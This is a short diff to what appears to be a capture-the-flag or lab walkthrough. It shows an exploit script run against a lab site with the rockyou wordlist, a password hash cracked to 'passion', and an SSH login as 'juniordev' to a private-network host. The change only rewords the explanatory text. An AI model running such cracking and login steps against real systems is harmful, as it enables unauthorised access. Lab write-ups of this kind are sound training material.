@@ -79,7 +79,8 @@ python 46635.py -u http://sentinal.com -w /opt/rockyou.txt --crack
 [+] Password found: a25bb9e6782e7329c236d2538dd4f5ac
 [+] Password cracked: passion
 ```
-Now we can use SSH with obtained creds to login to the system
+We get a username `juniordev` and a password `passion`.
+Now we can use this creds to SSH login to the system
 ```
 ssh juniordev@192.168.83.150
 password: passion
